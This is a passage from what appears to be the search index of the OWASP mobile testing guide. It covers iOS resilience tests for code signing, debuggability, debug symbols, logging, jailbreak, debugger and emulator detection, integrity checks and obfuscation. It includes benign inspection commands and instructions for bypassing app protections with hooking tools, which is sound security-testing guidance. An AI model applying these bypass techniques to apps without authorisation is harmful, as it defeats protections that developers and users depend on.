</ul>","tags":["ios","R","test","MSTG-CODE-1","masvs-resilience-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0081/#overview","title":"Overview","text":"","tags":["ios","R","test","MSTG-CODE-1","masvs-resilience-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0081/#static-analysis","title":"Static Analysis","text":"<p>You have to ensure that the app is using the latest code signature format. You can retrieve the signing certificate information from the application's .app file with  codesign. Codesign is used to create, check, and display code signatures, as well as inquire into the dynamic status of signed code in the system.</p> <p>After you get the application's IPA file, re-save it as a ZIP file and decompress the ZIP file. Navigate to the Payload directory, where the application's .app file will be.</p> <p>Execute the following <code>codesign</code> command to display the signing information:</p> <pre><code>$ codesign -dvvv YOURAPP.app\nExecutable=/Users/Documents/YOURAPP/Payload/YOURAPP.app/YOURNAME\nIdentifier=com.example.example\nFormat=app bundle with Mach-O universal (armv7 arm64)\nCodeDirectory v=20200 size=154808 flags=0x0(none) hashes=4830+5 location=embedded\nHash type=sha256 size=32\nCandidateCDHash sha1=455758418a5f6a878bb8fdb709ccfca52c0b5b9e\nCandidateCDHash sha256=fd44efd7d03fb03563b90037f92b6ffff3270c46\nHash choices=sha1,sha256\nCDHash=fd44efd7d03fb03563b90037f92b6ffff3270c46\nSignature size=4678\nAuthority=iPhone Distribution: Example Ltd\nAuthority=Apple Worldwide Developer Relations Certification Authority\nAuthority=Apple Root CA\nSigned Time=4 Aug 2017, 12:42:52\nInfo.plist entries=66\nTeamIdentifier=8LAMR92KJ8\nSealed Resources version=2 rules=12 files=1410\nInternal requirements count=1 size=176\n</code></pre> <p>There are various ways to distribute your app as described at the Apple documentation, which include using the App Store or via Apple Business Manager for custom or in-house distribution. In case of an in-house distribution scheme, make sure that no ad hoc certificates are used when the app is signed for distribution.</p>","tags":["ios","R","test","MSTG-CODE-1","masvs-resilience-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0082/","title":"MASTG-TEST-0082: Testing whether the App is Debuggable","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Debuggable Entitlement Enabled in the entitlements.plist</li> </ul>","tags":["ios","R","test","MSTG-CODE-2","masvs-resilience-4","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0082/#overview","title":"Overview","text":"","tags":["ios","R","test","MSTG-CODE-2","masvs-resilience-4","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0082/#static-analysis","title":"Static Analysis","text":"<p>Extract the entitlements from the app ( Extracting Entitlements from MachO Binaries) and check the value of the <code>get-task-allow</code> key. If it is set to <code>true</code>, the app is debuggable.</p> <pre><code>$ ldid -e iGoat-Swift.app/iGoat-Swift\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n    &lt;key&gt;application-identifier&lt;/key&gt;\n    &lt;string&gt;TNAJ496RHB.OWASP.iGoat-Swift&lt;/string&gt;\n    &lt;key&gt;com.apple.developer.team-identifier&lt;/key&gt;\n    &lt;string&gt;TNAJ496RHB&lt;/string&gt;\n    &lt;key&gt;get-task-allow&lt;/key&gt;\n    &lt;true/&gt;\n    &lt;key&gt;keychain-access-groups&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;TNAJ496RHB.OWASP.iGoat-Swift&lt;/string&gt;\n    &lt;/array&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>","tags":["ios","R","test","MSTG-CODE-2","masvs-resilience-4","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0082/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Check whether you can attach a debugger directly, as explained in  Debugging.</p> <p>Note: if the application is equipped with anti-reverse engineering controls, then the debugger can be detected and stopped.</p>","tags":["ios","R","test","MSTG-CODE-2","masvs-resilience-4","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0083/","title":"MASTG-TEST-0083: Testing for Debugging Symbols","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Testing for Debugging Symbols</li> </ul>","tags":["ios","R","test","MSTG-CODE-3","masvs-resilience-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0083/#overview","title":"Overview","text":"","tags":["ios","R","test","MSTG-CODE-3","masvs-resilience-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0083/#static-analysis","title":"Static Analysis","text":"<p>To verify the existence of debug symbols you can use objdump from binutils or llvm-objdump to inspect all of the app binaries.</p> <p>In the following snippet we run objdump over <code>TargetApp</code> (the iOS main app executable) to show the typical output of a binary containing debug symbols which are marked with the <code>d</code> (debug) flag. Check the objdump man page for information about various other symbol flag characters.</p> <pre><code>$ objdump --syms TargetApp\n\n0000000100007dc8 l    d  *UND* -[ViewController handleSubmitButton:]\n000000010000809c l    d  *UND* -[ViewController touchesBegan:withEvent:]\n0000000100008158 l    d  *UND* -[ViewController viewDidLoad]\n...\n000000010000916c l    d  *UND* _disable_gdb\n00000001000091d8 l    d  *UND* _detect_injected_dylds\n00000001000092a4 l    d  *UND* _isDebugged\n...\n</code></pre> <p>To prevent the inclusion of debug symbols, set <code>Strip Debug Symbols During Copy</code> to <code>YES</code> via the XCode project's build settings. Stripping debugging symbols will not only reduce the size of the binary but also increase the difficulty of reverse engineering.</p>","tags":["ios","R","test","MSTG-CODE-3","masvs-resilience-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0083/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Dynamic analysis is not applicable for finding debugging symbols.</p>","tags":["ios","R","test","MSTG-CODE-3","masvs-resilience-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0084/","title":"MASTG-TEST-0084: Testing for Debugging Code and Verbose Error Logging","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0084: Testing for Debugging Code and Verbose Error Logging (ios)</p> <p> Send Feedback</p>","tags":["ios","R","test","MSTG-CODE-4","masvs-resilience-3"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0084/#overview","title":"Overview","text":"","tags":["ios","R","test","MSTG-CODE-4","masvs-resilience-3"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0084/#static-analysis","title":"Static Analysis","text":"<p>You can take the following static analysis approach for the logging statements:</p> <ol> <li>Import the application's code into Xcode.</li> <li>Search the code for the following printing functions: <code>NSLog</code>, <code>println</code>, <code>print</code>, <code>dump</code>, <code>debugPrint</code>.</li> <li>When you find one of them, determine whether the developers used a wrapping function around the logging function for better mark up of the statements to be logged; if so, add that function to your search.</li> <li>For every result of steps 2 and 3, determine whether macros or debug-state related guards have been set to turn the logging off in the release build. Please note the change in how Objective-C can use preprocessor macros:</li> </ol> <pre><code>#ifdef DEBUG\n    // Debug-only code\n#endif\n</code></pre> <p>The procedure for enabling this behavior in Swift has changed: you need to either set environment variables in your scheme or set them as custom flags in the target's build settings. Please note that the following functions (which allow you to determine whether the app was built in the Swift 2.1. release-configuration) aren't recommended, as Xcode 8 and Swift 3 don't support these functions:</p> <ul> <li><code>_isDebugAssertConfiguration</code></li> <li><code>_isReleaseAssertConfiguration</code></li> <li><code>_isFastAssertConfiguration</code>.</li> </ul> <p>Depending on the application's setup, there may be more logging functions. For example, when CocoaLumberjack is used, static analysis is a bit different.</p> <p>For the \"debug-management\" code (which is built-in): inspect the storyboards to see whether there are any flows and/or view-controllers that provide functionality different from the functionality the application should support. This functionality can be anything from debug views to printed error messages, from custom stub-response configurations to logs written to files on the application's file system or a remote server.</p> <p>As a developer, incorporating debug statements into your application's debug version should not be a problem as long as you make sure that the debug statements are never present in the application's release version.</p> <p>In Objective-C, developers can use preprocessor macros to filter out debug code:</p> <pre><code>#ifdef DEBUG\n    // Debug-only code\n#endif\n</code></pre> <p>In Swift 2 (with Xcode 7), you have to set custom compiler flags for every target, and compiler flags have to start with \"-D\". So you can use the following annotations when the debug flag <code>DMSTG-DEBUG</code> is set:</p> <pre><code>#if MSTG_DEBUG\n    // Debug-only code\n#endif\n</code></pre> <p>In Swift 3 (with Xcode 8), you can set Active Compilation Conditions in Build settings/Swift compiler - Custom flags. Instead of a preprocessor, Swift 3 uses conditional compilation blocks based on the defined conditions:</p> <pre><code>#if DEBUG_LOGGING\n    // Debug-only code\n#endif\n</code></pre>","tags":["ios","R","test","MSTG-CODE-4","masvs-resilience-3"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0084/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Dynamic analysis should be executed on both a simulator and a device because developers sometimes use target-based functions (instead of functions based on a release/debug-mode) to execute the debugging code.</p> <ol> <li>Run the application on a simulator and check for output in the console during the app's execution.</li> <li>Attach a device to your Mac, run the application on the device via Xcode, and check for output in the console during the app's execution.</li> </ol> <p>For the other \"manager-based\" debug code: click through the application on both a simulator and a device to see if you can find any functionality that allows an app's profiles to be pre-set, allows the actual server to be selected or allows responses from the API to be selected.</p>","tags":["ios","R","test","MSTG-CODE-4","masvs-resilience-3"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0088/","title":"MASTG-TEST-0088: Testing Jailbreak Detection","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Jailbreak Detection in Code</li> <li> Runtime Use of Jailbreak Detection Techniques</li> </ul>","tags":["ios","R","test","MSTG-RESILIENCE-1","masvs-resilience-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0088/#overview","title":"Overview","text":"<p>To test for jailbreak detection install the app on a jailbroken device.</p> <p>Launch the app and see what happens:</p> <p>If it implements jailbreak detection, you might notice one of the following things:</p> <ul> <li>The app crashes and closes immediately, without any notification.</li> <li>A pop-up window indicates that the app won't run on a jailbroken device.</li> </ul> <p>Note that crashes might be an indicator of jailbreak detection but the app may be crashing for any other reasons, e.g. it may have a bug. We recommend to test the app on non-jailbroken device first, especially when you're testing preproduction versions.</p> <p>Launch the app and try to bypass Jailbreak Detection using an automated tool:</p> <p>If it implements jailbreak detection, you might be able to see indicators of that in the output of the tool. See section \"Automated Jailbreak Detection Bypass\".</p> <p>Reverse Engineer the app:</p> <p>The app might be using techniques that are not implemented in the automated tools that you've used. If that's the case you must reverse engineer the app to find proofs. See section \"Manual Jailbreak Detection Bypass\".</p>","tags":["ios","R","test","MSTG-RESILIENCE-1","masvs-resilience-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0089/","title":"MASTG-TEST-0089: Testing Anti-Debugging Detection","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0089: Testing Anti-Debugging Detection (ios)</p> <p> Send Feedback</p>","tags":["ios","R","test","MSTG-RESILIENCE-2","masvs-resilience-4"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0089/#overview","title":"Overview","text":"<p>In order to test for anti-debugging detection you can try to attach a debugger to the app and see what happens.</p> <p>The app should respond in some way. For example by:</p> <ul> <li>Alerting the user and asking for accepting liability.</li> <li>Preventing execution by gracefully terminating.</li> <li>Securely wiping any sensitive data stored on the device.</li> <li>Reporting to a backend server, e.g, for fraud detection.</li> </ul> <p>Try to hook or reverse engineer the app using the methods from section \"Anti-Debugging Detection\".</p> <p>Next, work on bypassing the detection and answer the following questions:</p> <ul> <li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li> <li>How difficult is identifying the detection code via static and dynamic analysis?</li> <li>Did you need to write custom code to disable the defenses? How much time did you need?</li> <li>What is your assessment of the difficulty of bypassing the mechanisms?</li> </ul>","tags":["ios","R","test","MSTG-RESILIENCE-2","masvs-resilience-4"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0090/","title":"MASTG-TEST-0090: Testing File Integrity Checks","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0090: Testing File Integrity Checks (ios)</p> <p> Send Feedback</p>","tags":["ios","R","test","MSTG-RESILIENCE-3","MSTG-RESILIENCE-11","masvs-resilience-2"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0090/#overview","title":"Overview","text":"<p>Application Source Code Integrity Checks:</p> <p>Run the app on the device in an unmodified state and make sure that everything works. Then apply some patches to the executable (e.g. see  Injecting Frida Gadget into an IPA Automatically), re-sign the app ( Signing IPA files), and run it.</p> <p>The app should respond in some way. For example by:</p> <ul> <li>Alerting the user and asking for accepting liability.</li> <li>Preventing execution by gracefully terminating.</li> <li>Securely wiping any sensitive data stored on the device.</li> <li>Reporting to a backend server, e.g, for fraud detection.</li> </ul> <p>Work on bypassing the defenses and answer the following questions:</p> <ul> <li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li> <li>How difficult is identifying the detection code via static and dynamic analysis?</li> <li>Did you need to write custom code to disable the defenses? How much time did you need?</li> <li>What is your assessment of the difficulty of bypassing the mechanisms?</li> </ul> <p>File Storage Integrity Checks:</p> <p>Go to the app data directories as indicated in  Accessing App Data Directories and modify some files.</p> <p>Next, work on bypassing the defenses and answer the following questions:</p> <ul> <li>Can the mechanisms be bypassed trivially (e.g., by changing the contents of a file or a key-value pair)?</li> <li>How difficult is obtaining the HMAC key or the asymmetric private key?</li> <li>Did you need to write custom code to disable the defenses? How much time did you need?</li> <li>What is your assessment of the difficulty of bypassing the mechanisms?</li> </ul>","tags":["ios","R","test","MSTG-RESILIENCE-3","MSTG-RESILIENCE-11","masvs-resilience-2"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0091/","title":"MASTG-TEST-0091: Testing Reverse Engineering Tools Detection","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0091: Testing Reverse Engineering Tools Detection (ios)</p> <p> Send Feedback</p>","tags":["ios","R","test","MSTG-RESILIENCE-4","masvs-resilience-4"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0091/#overview","title":"Overview","text":"<p>Launch the app with various reverse engineering tools and frameworks installed on your test device, such as  Frida,  ElleKit, or  SSL Kill Switch 3.</p> <p>The app should respond in some way to the presence of those tools. For example by:</p> <ul> <li>Alerting the user and asking for accepting liability.</li> <li>Preventing execution by gracefully terminating.</li> <li>Securely wiping any sensitive data stored on the device.</li> <li>Reporting to a backend server, e.g, for fraud detection.</li> </ul> <p>Next, work on bypassing the detection of the reverse engineering tools and answer the following questions:</p> <ul> <li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li> <li>How difficult is identifying the detection code via static and dynamic analysis?</li> <li>Did you need to write custom code to disable the defenses? How much time did you need?</li> <li>What is your assessment of the difficulty of bypassing the mechanisms?</li> </ul>","tags":["ios","R","test","MSTG-RESILIENCE-4","masvs-resilience-4"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0092/","title":"MASTG-TEST-0092: Testing Emulator Detection","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0092: Testing Emulator Detection (ios)</p> <p> Send Feedback</p>","tags":["ios","R","test","MSTG-RESILIENCE-5","masvs-resilience-1"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0092/#overview","title":"Overview","text":"<p>In order to test for emulator detection you can try to run the app on different emulators as indicated in section \"Emulator Detection\" and see what happens.</p> <p>The app should respond in some way. For example by:</p> <ul> <li>Alerting the user and asking for accepting liability.</li> <li>Preventing execution by gracefully terminating.</li> <li>Reporting to a backend server, e.g, for fraud detection.</li> </ul> <p>You can also reverse engineer the app using ideas for strings and methods from section \"Emulator Detection\".</p> <p>Next, work on bypassing this detection and answer the following questions:</p> <ul> <li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li> <li>How difficult is identifying the detection code via static and dynamic analysis?</li> <li>Did you need to write custom code to disable the defenses? How much time did you need?</li> <li>What is your assessment of the difficulty of bypassing the mechanisms?</li> </ul>","tags":["ios","R","test","MSTG-RESILIENCE-5","masvs-resilience-1"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0093/","title":"MASTG-TEST-0093: Testing Obfuscation","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0093: Testing Obfuscation (ios)</p> <p> Send Feedback</p>","tags":["ios","R","test","MSTG-RESILIENCE-9","masvs-resilience-3"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0093/#overview","title":"Overview","text":"<p>Attempt to disassemble the Mach-O in the IPA and any included library files in the \"Frameworks\" directory (.dylib or .framework files), and perform static analysis. At the very least, the app's core functionality (i.e., the functionality meant to be obfuscated) shouldn't be easily discerned. Verify that:</p> <ul> <li>meaningful identifiers, such as class names, method names, and variable names, have been discarded.</li> <li>string resources and strings in binaries are encrypted.</li> <li>code and data related to the protected functionality is encrypted, packed, or otherwise concealed.</li> </ul> <p>For a more detailed assessment, you need a detailed understanding of the relevant threats and the obfuscation methods used.</p>","tags":["ios","R","test","MSTG-RESILIENCE-9","masvs-resilience-3"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0219/","title":"MASTG-TEST-0219: Testing for Debugging Symbols","text":"","tags":["ios","R","test","MASWE-0093"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0219/#overview","title":"Overview","text":"<p>This test case checks for debugging symbols in all binaries contained in the app.</p> <p>Debugging symbols are added by the compiler to ease development and allow symbolication of crashes. However, they can also be used to reverse engineer the app and should not be present in a released app. Symbolication can also be performed with a separate dSYM file.</p> <p>To manage debugging symbols in Xcode, developers can adjust the following build settings:</p> <ul> <li>Generate Debug Symbols: Xcode adds debugging symbols if the setting <code>\"Build Settings\" &gt; \"Apple Clang - Code Generation\" &gt; \"Generate Debug Symbols\"</code> is set to <code>\"Yes\"</code>.</li> <li>Debug Information Format: Found under <code>\"Build Settings\" &gt; \"Build Options &gt; \"Debug Information Format\"</code>, this setting determines the format of the debug information. Options include:<ul> <li>DWARF: Embeds debugging information directly into the binary.</li> <li>DWARF with dSYM File: Generates a separate dSYM file containing debugging information.</li> </ul> </li> </ul> <p>Note that in compiled iOS applications, symbol names may undergo name mangling and additional obfuscation techniques to further obscure them, making reverse engineering more challenging. While demangling tools can decode standard mangled names (see  Demangling Symbols), they may not effectively reverse custom obfuscation methods.</p>","tags":["ios","R","test","MASWE-0093"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0219/#steps","title":"Steps","text":"<ol> <li>Apply  Exploring the App Package to extract the contents from the IPA file.</li> <li>For all executables and libraries of the app, use  Obtaining Debugging Symbols to verify there are no debugging symbols present.</li> </ol>","tags":["ios","R","test","MASWE-0093"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0219/#observation","title":"Observation","text":"<p>The output should contain a list of symbols for each executable and library.</p>","tags":["ios","R","test","MASWE-0093"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0219/#evaluation","title":"Evaluation","text":"<p>The test fails if there are symbols marked as debug symbols in the output.</p> <p>Before releasing an iOS app, verify that the <code>\"Build Settings\" &gt; \"Apple Clang - Code Generation\" &gt; \"Generate Debug Symbols\"</code> setting is set to <code>\"No\"</code>. Additionally, utilize tools like the ones used in  Obtaining Debugging Symbols to inspect the final binaries for any residual debugging symbols.</p> <p>For release builds, it's advisable to set <code>\"Build Settings\" &gt; \"Build Options &gt; \"Debug Information Format\"</code> to <code>\"DWARF with dSYM File\"</code> and ensure that the dSYM files are securely stored and not distributed with the app. This approach facilitates post-release crash analysis without exposing debugging symbols in the distributed binary.</p>","tags":["ios","R","test","MASWE-0093"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0220/","title":"MASTG-TEST-0220: Usage of Outdated Code Signature Format","text":"","tags":["ios","R","test","MASWE-0104"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0220/#overview","title":"Overview","text":"<p>On iOS, code signatures verify the integrity and authenticity of an app's binary, preventing unauthorized modifications and ensuring that the app is trusted by the operating system. Apple regularly updates its code signature formats to enhance cryptographic strength and improve protection against tampering.</p> <p>Using an outdated code signature format may expose the app to security risks, as older formats may lack support for current cryptographic standards and may be more vulnerable to manipulation. Adopting the latest code signature format helps maintain app integrity and ensures compatibility with the latest security features in iOS.</p>","tags":["ios","R","test","MASWE-0104"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0220/#steps","title":"Steps","text":"<ol> <li>Extract the package as described in  Exploring the App Package.</li> <li>Obtain the version of the code signature format as described in  Reverse Engineering Flutter Applications.</li> </ol>","tags":["ios","R","test","MASWE-0104"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0220/#observation","title":"Observation","text":"<p>The output should contain the version of the code signature format.</p>","tags":["ios","R","test","MASWE-0104"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0220/#evaluation","title":"Evaluation","text":"<p>The test fails if the version is below the recommended one.</p> <p>Ensure that the app is using the latest code signing format. You can retrieve the signing certificate format with  Reverse Engineering Flutter Applications. This will ensure that the integrity of the app is protected according to the latest cryptographic standards, preventing tampering with the app binary and ensuring that the unmodified copy is distributed to users.</p>","tags":["ios","R","test","MASWE-0104"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0240/","title":"MASTG-TEST-0240: Jailbreak Detection in Code","text":"","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0240/#overview","title":"Overview","text":"<p>The test verifies that a mobile app can detect if the iOS device it is running on is jailbroken. It does so by statically analyzing the app binary for common jailbreak detection checks. For example, the app may check for the presence of a third-party app store (e.g. Sileo, Zebra, ...), or for the presence of certain files or directories that are indicative of a jailbroken device.</p> <p>The limitations of static analysis should be considered. It is possible that the app uses more sophisticated jailbreak detection techniques that are not detected by the used tool. In such cases, careful manual reverse engineering and deobfuscation are required to identify the jailbreak detection checks.</p>","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0240/#steps","title":"Steps","text":"<ol> <li>Run a static analysis tool such as  radare2 for iOS on the app binary looking for common jailbreak detection checks.</li> </ol>","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0240/#observation","title":"Observation","text":"<p>The output should include any instances of common jailbreak detection checks in the app binary.</p>","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0240/#evaluation","title":"Evaluation","text":"<p>The test passes if jailbreak detection is implemented.</p> <p>The test fails if jailbreak detection is not implemented. However, note that this test is not exhaustive and may not detect all jailbreak detection checks. Manual reverse engineering and deobfuscation may be required to identify more sophisticated jailbreak detection checks.</p>","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0240/#demos","title":"Demos","text":"<p> MASTG-DEMO-0021: Uses of Jailbreak Detection Techniques with r2 </p>","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0241/","title":"MASTG-TEST-0241: Runtime Use of Jailbreak Detection Techniques","text":"","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0241/#overview","title":"Overview","text":"<p>The test verifies that a mobile application can identify if the iOS device it is running on is jailbroken. It does so by dynamically analyzing the app binary for common jailbreak detection checks and trying to bypass them. For example, it may detect a check for the presence of certain files or directories that are indicative of a jailbroken device.</p> <p>The limitations of using jailbreak detection bypass tools should be considered. It is possible that the app uses more sophisticated jailbreak detection techniques that are not detected by the tool used. In such cases, careful manual reverse engineering and deobfuscation are required to identify the jailbreak detection checks. Also, additional dynamic analysis work may be required to bypass the jailbreak detection checks.</p>","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0241/#steps","title":"Steps","text":"<ol> <li>Run a dynamic analysis tool such as  objection on the app and execute its automated jailbreak detection bypass commands</li> </ol>","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0241/#observation","title":"Observation","text":"<p>The output should include any instances of common jailbreak detection checks in the app binary and the results of the automated jailbreak detection bypass commands.</p>","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0241/#evaluation","title":"Evaluation","text":"<p>The test passes if the automated jailbreak detection bypass command indicates that the application is testing for known jailbreak artefacts.</p> <p>The test fails if jailbreak detection is not implemented. However, note that this test is not exhaustive and may not detect all jailbreak detection checks as it relies on predefined bypass code that may not cover all possible jailbreak detection checks or may not be up-to-date. The checks may also be more sophisticated than what the tool can detect so manual reverse engineering and deobfuscation may be required to identify them.</p>","tags":["ios","R","test","MASWE-0097"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0246/","title":"MASTG-TEST-0246: Runtime Use of Secure Screen Lock Detection APIs","text":"","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0246/#overview","title":"Overview","text":"<p>This test is the dynamic counterpart to  References to APIs for Detecting Secure Screen Lock.</p>","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0246/#steps","title":"Steps","text":"<ol> <li>Run a dynamic analysis tool like  Frida for iOS and look for uses of LAContext.canEvaluatePolicy(.deviceOwnerAuthentication) API or data stored with kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly attribute.</li> </ol>","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0246/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0246/#evaluation","title":"Evaluation","text":"<p>The test fails if an app doesn't use any API to verify the secure screen lock presence.</p>","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0246/#demos","title":"Demos","text":"<p> MASTG-DEMO-0026: Runtime Use of LAContext.canEvaluatePolicy with Frida </p>","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0248/","title":"MASTG-TEST-0248: References to APIs for Detecting Secure Screen Lock","text":"","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0248/#overview","title":"Overview","text":"<p>This test verifies that an app is running on a device with a secure screen lock (e.g. a passcode).</p> <p>On iOS, apps can determine whether a secure screen lock is set using the LocalAuthentication framework. Specifically, the LAContext.canEvaluatePolicy(_:error:) method with the .deviceOwnerAuthentication or .deviceOwnerAuthenticationWithBiometrics policy can be used to check if authentication mechanisms, including a passcode, are available.</p> <p>Apps leveraging the Keychain Services API can require passcode authentication before accessing sensitive data using the kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly attribute.</p>","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0248/#steps","title":"Steps","text":"<ol> <li>Run a static analysis tool such as  radare2 for iOS on the app binary and look for uses of LAContext.canEvaluatePolicy(.deviceOwnerAuthentication) API, or data stored with kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly attribute.</li> </ol>","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0248/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0248/#evaluation","title":"Evaluation","text":"<p>The test fails if an app doesn't use any API to 